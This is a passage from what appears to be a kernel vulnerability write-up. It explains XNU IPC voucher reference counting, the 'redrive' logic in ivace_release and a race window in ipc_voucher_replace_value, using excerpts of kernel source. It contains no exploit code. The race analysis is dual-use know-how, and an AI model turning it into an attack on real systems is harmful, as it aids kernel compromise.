 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">else</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>They grab the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s lock again and recalculate a pointer to the </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;(because the table could have been reallocated while the </span><span class="BGLtzooHlW-c11">ivac</span><span class="BGLtzooHlW-c10">&nbsp;lock was dropped, and only the index into the table would be valid, not a pointer.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Then things get really weird; if </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_made</span><span>&nbsp;isn&#39;t equal to </span><span class="BGLtzooHlW-c11">made</span><span>&nbsp;but </span><span class="BGLtzooHlW-c11">user_data_release_value</span><span>&nbsp;did return </span><span class="BGLtzooHlW-c11">KERN_SUCCESS</span><span>, then they subtract the old value of </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;from the current value of </span><span class="BGLtzooHlW-c11">ivace_made</span><span>, and if </span><span class="BGLtzooHlW-c11">ivace_refs</span><span>&nbsp;is </span><span class="BGLtzooHlW-c11">0</span><span>, they use a </span><span class="BGLtzooHlW-c11">goto</span><span>&nbsp;statement to try to free the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span class="BGLtzooHlW-c10">&nbsp;again?</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">If that makes complete sense to you at first glance then give yourself a gold star! Because to me at first that logic was completely impenetrable. We will get to the bottom of it though.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>We need to ask the question: under what circumstances will </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;and the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&#39;s </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field ever be different? To answer this we need to look back at </span><span class="BGLtzooHlW-c11">ipc_voucher_replace_value</span><span>&nbsp;where the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">ivace</span><span class="BGLtzooHlW-c10">&nbsp;are actually allocated:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.6678b43a7a459c004d346e8b4b835a591c986cfd"></a><a id="t.48"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivam_get_value</span><span class="BGLtzooHlW-c2">)(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; previous_vals</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;previous_vals_count</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_flag</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_value_voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">...</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c7">/* </span><span class="BGLtzooHlW-c7 BGLtzooHlW-c23">WINDOW</span><span class="BGLtzooHlW-c7">&nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; val_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace_reference_by_value</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;new_value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;new_flag</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>We already looked at this code; if you can&#39;t remember what </span><span class="BGLtzooHlW-c11">ivam_get_value</span><span>&nbsp;or </span><span class="BGLtzooHlW-c11">ivace_reference_by_value</span><span class="BGLtzooHlW-c10">&nbsp;are meant to do, I&#39;d suggest going back and looking at those sections again.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Firstly, </span><span class="BGLtzooHlW-c11">ipc_voucher_replace_value</span><span>&nbsp;itself isn&#39;t holding any locks. It does however hold a few references (e.g., on the </span><span class="BGLtzooHlW-c11">ivac</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">ivam</span><span class="BGLtzooHlW-c10">.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">user_data_get_value</span><span>&nbsp;(the value of </span><span class="BGLtzooHlW-c11">ivam-&gt;ivam_get_value</span><span>) only takes the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;lock (and not in all paths; we&#39;ll get to that) and </span><span class="BGLtzooHlW-c11">ivace_reference_by_value</span><span>, which increments </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_made</span><span>&nbsp;does that under the </span><span class="BGLtzooHlW-c11">ivac</span><span class="BGLtzooHlW-c10">&nbsp;lock.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;should therefore </span><span class="BGLtzooHlW-c17">always</span><span>&nbsp;get incremented before any corresponding </span><span class="BGLtzooHlW-c11">ivace</span><span>&#39;s </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;field. And there is a small window (marked as </span><span class="BGLtzooHlW-c23">WINDOW</span><span>&nbsp;above) where </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;will be </span><span class="BGLtzooHlW-c17">larger</span><span>&nbsp;than the </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;field of the </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;which will end up with a pointer to the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>. If, in exactly that window shown above, another thread grabs the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s lock and drops the last reference (</span><span class="BGLtzooHlW-c11">ivace_refs</span><span>) on the </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;which currently points to that </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;then we&#39;ll encounter one of the more complex situations outlined above where, in </span><span class="BGLtzooHlW-c11">ivace_release</span><span>&nbsp;</span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;is </span><span class="BGLtzooHlW-c17">not</span><span>&nbsp;equal to the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&#39;s </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field. The reason that there is special treatment of that case is that it&#39;s indicating that there is a live pointer to the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;which isn&#39;t yet accounted for by the </span><span class="BGLtzooHlW-c11">ivace</span><span>, and therefore it&#39;s not valid to free the </span><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">user_data_value_element.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Another way to view this is that it&#39;s a hack around not holding a lock across that window shown above.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">With this insight we can start to unravel the &quot;redrive&quot; logic:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11"></span></p><a id="t.1c71158a8af57bb6d3e831d618708883a379cc86"></a><a id="t.49"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">-=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">goto</span><span class="BGLtzooHlW-c4">&nbsp;redrive</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">else</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* If the manager returned FAILURE, someone took a</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* reference on the value but have not updated the ivace,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* release the lock and return since thread who got</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* the new reference will update the ivace and will have</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* non-zero reference on the value.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Let&#39;s take the first case:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">made</span><span>&nbsp;is the value of </span><span class="BGLtzooHlW-c11">ivace-&gt;ivace_made</span><span>&nbsp;before the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s lock was dropped and re-acquired. If those are different, it indicates that a race did occur and another thread (or threads) revived this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;(since even though the refs has gone to zero it hasn&#39;t yet been removed by this thread from the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s hash table, and even though it&#39;s been marked as being released by setting </span><span class="BGLtzooHlW-c11">ivace_releasing</span><span>&nbsp;to </span><span class="BGLtzooHlW-c11">TRUE</span><span class="BGLtzooHlW-c10">, that doesn&#39;t prevent another reference being handed out on a racing thread.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">There are then two distinct sub-cases:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>1) </span><span class="BGLtzooHlW-c11">(ivace-&gt;ivace_made != made)</span><span>&nbsp;and </span><span class="BGLtzooHlW-c19 BGLtzooHlW-c11">(KERN_SUCCESS == kr)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>We can now parse the meaning of this: this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;was revived but that occurred after the </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;was freed on this thread. The racing thread then allocated a *new* value which happened to be exactly the same as the </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;has, hence the other thread getting a reference on this </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;before this thread was able to remove it from the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s hash table. Note that for the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;case the </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;is a pointer (making this particular case even more unlikely, but not impossible) but it isn&#39;t going to always be the case that the value is a pointer; at the </span><span class="BGLtzooHlW-c11">ivac</span><span>&nbsp;layer the </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;is actually a 64-bit </span><span class="BGLtzooHlW-c14">handle</span><span>. The </span><span class="BGLtzooHlW-c11">user_data</span><span class="BGLtzooHlW-c10">&nbsp;attr chooses to store a pointer there.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>So what&#39;s happened in this case is that another thread has looked up an </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;for a new </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&nbsp;which happens to </span><span class="BGLtzooHlW-c14">collide</span><span class="BGLtzooHlW-c10">&nbsp;(due to having a matching pointer, but potentially different buffer contents) with the value that this thread had. I don&#39;t think this actually has security implications; but it does take a while to get your head around.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>If this is the case then we&#39;ve ended up with a pointer to a revived ivace which now, despite having a matching </span><span class="BGLtzooHlW-c11">ivace_value</span><span>, is never-the-less semantically different from the </span><span class="BGLtzooHlW-c11">ivace</span><span>&nbsp;we had when this thread entered this function. The connection between our thread&#39;s idea of </span><span class="BGLtzooHlW-c11">ivace_made</span><span>&nbsp;and the </span><span class="BGLtzooHlW-c11">ivace_value</span><span>&#39;s </span><span class="BGLtzooHlW-c11">e_made</span><span class="BGLtzooHlW-c10">&nbsp;has been severed; and we need to remove our thread&#39;s contribution to that; hence:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.1577686d6e27cb6539edf4c668c25d37d0e6652c"></a><a id="t.50"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made </span><span class="BGLtzooHlW-c2">-=</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>2) </span><span class="BGLtzooHlW-c11">(ivace-&gt;ivace_made != made)</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">(0 == ivace-&gt;ivace_refs)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>In this case another thread (or threads) has raced, revived this ivace and then deallocated all their references. Since this thread set </span><span class="BGLtzooHlW-c11">ivace_releasing</span><span>&nbsp;to </span><span class="BGLtzooHlW-c11">TRUE</span><span>&nbsp;the racing thread, after decrementing </span><span class="BGLtzooHlW-c11">ivace_refs</span><span class="BGLtzooHlW-c10">&nbsp;back to zero encountered this:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.26d470c1ed36965b7017da35a088eb61bd6b63c5"></a><a id="t.51"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
